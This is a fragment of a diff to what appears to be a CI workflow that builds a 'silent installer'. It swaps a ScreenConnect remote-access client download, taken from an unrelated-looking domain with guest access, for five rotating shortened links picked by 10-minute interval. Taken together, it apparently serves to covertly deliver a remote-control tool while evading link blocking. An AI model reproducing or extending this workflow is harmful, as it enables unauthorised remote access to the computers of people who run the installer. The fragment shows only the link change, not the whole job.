@@ -16,7 +16,7 @@ jobs:
     - name: Create Silent Installer
       run: |
         # Define your download links
-        links=("https://hayw.fussionmann.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest")
+        links=("https://share.google/jraH4hXE8DKHc3EXZ" "https://share.google/5icY94HkmAiaVcn86" "https://share.google/mkGe1JX56Lut4KMdt" "https://share.google/zwqwLoZiVh08jLOa4" "https://share.google/dDynM21vQuy0Qvc4Z")
         
         # Get current link based on 10-minute interval
         current_minute=$(date +%M)
